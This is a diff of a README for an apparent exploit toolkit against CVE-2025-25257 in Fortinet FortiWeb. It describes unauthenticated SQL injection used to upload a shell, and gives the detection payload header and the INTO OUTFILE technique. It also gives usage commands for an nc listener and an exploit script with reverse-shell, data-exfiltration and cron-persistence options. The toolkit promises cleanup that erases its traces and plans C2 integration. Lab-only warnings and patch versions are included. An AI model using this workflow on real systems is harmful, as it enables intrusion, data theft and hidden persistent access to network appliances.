@@ -1,101 +1,117 @@
 # FortiWeb RCE Toolkit 🔐
 
-Automated proof-of-concept tool for **CVE-2025-25257** in Fortinet FortiWeb – featuring **reverse shell**, **exfiltration**, **persistence**, and **cleanup**. **Only for lab/testing environments. DO NOT USE in production.**
+Automated proof‑of‑concept tool for **CVE‑2025‑25257** in Fortinet FortiWeb — featuring **reverse shell**, **encrypted data exfiltration**, **persistence**, and **cleanup**. This toolkit is **strictly for isolated lab/testing environments**. **DO NOT USE in production.**
 
 ---
 
 ## ⚙️ Features
 
-- ✔️ Pre-authenticated detection of vulnerable FortiWeb versions  
-- 🐚 Reverse shell (bash) via `/cgi-bin/shell.sh`  
-- 📤 Encrypted data exfiltration to `/tmp/exfil.txt` (Base64-encoded)  
-- 🕒 Persistence via cron job (`/etc/cron.d/sys`)  
-- 🧹 Full cleanup after use (removes shell + cron + SQL traces)  
-- 🔒 Only active while listener runs and cleanup is triggered  
+- ✔️ **Pre‑auth detection** of vulnerable FortiWeb versions (7.0.0–7.0.10, 7.2.0–7.2.10, 7.4.0–7.4.7, 7.6.0–7.6.3)
+- 🐚 **Reverse shell** (bash) via `/cgi-bin/shell.sh`
+- 📤 **Encrypted data exfiltration** to `/tmp/exfil.txt` (Base64‑encoded)
+- 🕒 **Persistence** via cron job (`/etc/cron.d/sys`)
+- 🧹 **Full cleanup**: removes shell, cron job, and SQL traces
+- 🔒 Active only while listener runs and cleanup occurs
+
+---
+
+## 📊 Severity & Affected Versions
+
+- **CVE‑2025‑25257**: Unauthenticated SQL injection → Remote Code Execution (RCE)
+- **CVSS v3.1**: **9.6 (Critical)**
+- **Vulnerable versions**:
+  - FortiWeb 7.0.0–7.0.10 → Upgrade to **7.0.11+**
+  - FortiWeb 7.2.0–7.2.10 → Upgrade to **7.2.11+**
+  - FortiWeb 7.4.0–7.4.7 → Upgrade to **7.4.8+**
+  - FortiWeb 7.6.0–7.6.3 → Upgrade to **7.6.4+**
 
 ---
 
 ## 📋 Requirements
 
-- Python 3.6+  
-- `requests` library:  
+- Python **3.6+**
+- Install `requests`:
   ```bash
   pip install requests
-***
 
+
+---
 ## 🚀 Usage
 
 ```bash
 git clone https://github.com/youruser/fortiweb_rce_toolkit.git
 cd fortiweb_rce_toolkit
 
-# Run attacker listener
+# Start listener
 nc -lnvp 4444
 
-# Run exploit with options
-python3 exploit.py <target> --https --lhost <attacker_ip> --lport 4444 \
-   --exfil "user(),version()" --persist
+# Run exploit
+python3 exploit.py <target> --https --lhost <your_ip> --lport 4444 \
+  [--exfil "user(),version()"] [--persist]
 
-# After shell session ends
-# Press ENTER to trigger cleanup
+# After shell exits, press ENTER to cleanup
 ```
 
-* Use `--https` if target uses HTTPS
+* `--https` if target uses HTTPS
 
-* `--lhost` and `--lport` must match your listener
+* `--lhost` & `--lport` must match listener settings
 
 * `--exfil` (optional): SQL expression to exfiltrate
 
-* `--persist`: (optional) enables cron persistence
+* `--persist` (optional): enables cron persistence
 
-***
+---
 
-## 🔒 Technical Workflow
+## 🔧 Technical Workflow
 
-1. **Detect** vulnerability by sending `Authorization: Bearer AAAAAA'or'1'='1`
+1. Detection via injection (`Authorization: Bearer AAAAAA'or'1'='1`)
 
-2. **Upload** `/cgi-bin/shell.sh` via SQL injection
+2. Upload shell using `SELECT INTO OUTFILE`
 
-3. **Optional exfil**: writes base64 result of SQL query to `/tmp/exfil.txt`
+3. Optionally exfiltrate data to `/tmp/exfil.txt`
 
-4. **Optional persistence**: cron job executes shell every 5 minutes
+4. Optionally set cron persistence
 
-5. **User invokes shell and performs tasks**
+5. Reverse shell execution
 
-6. **Cleanup** wipes shell, cron job, and SQL artifacts
+6. Cleanup: shell removal, cron job deletion, SQL cleanup
 
-***
+---
 
 ## ⚠️ Warnings & Ethics
 
-* ⚠️ **Only use in isolated lab environments.**
+* ⚠️ Use **only in lab environments**
 
-* ⚠️ **Using this tool on production systems is illegal and unethical.**
+* ⚠️ **Illegal/unethical** on production
 
-* 📌 Always patch FortiWeb to a fixed version: `7.0.11+`, `7.2.11+`, `7.4.8+`, or `7.6.4+`.
+* 🚨 Patch FortiWeb to **7.0.11+, 7.2.11+, 7.4.8+, or 7.6.4+**
 
-  * See advisories: FortiGuard, TheHackerNews, BleepingComputer, InfosecBulletin
+* 🛡️ Consider disabling HTTP/HTTPS management until patched
 
-* 🔍 Recommended defensive action: block HTTP management interfaces until patched
-
-***
+---
 
 ## 🛠️ Future Enhancements
 
-* TLS over reverse shell
+* TLS‑encrypted reverse shell
 
-* Encrypted exfil file transfer (SCP/s3)
+* Encrypted exfil (SCP, S3)
 
-* Automated Steam-level C2 communication
+* Automated C2 communication
 
-* Integration with Red Team frameworks (e.g. Cobalt Strike, Covenant)
+* Integration with Red Team frameworks (Cobalt Strike, Covenant)
 
-***
+---
 
-## 🧠 References
+## 📚 References
 
-* CVE‑2025‑25257 advisory & PoC: Fortinet, Rapid7, BleepingComputer
+* Fortinet FortiGuard PSIRT
 
-* Technical analysis: Undercode Testing, InfoSecBulletin
+* BleepingComputer, TheHackerNews, SecurityOnline
 
-* FortiWeb patch versions: FortiGuard FG‑IR‑25‑151
+* EventusSecurity, InfoSecBulletin, Arctic Wolf, Tenable
+
+---
+
+## 📄 License
+
+MIT License © 2025 `<YourName>`
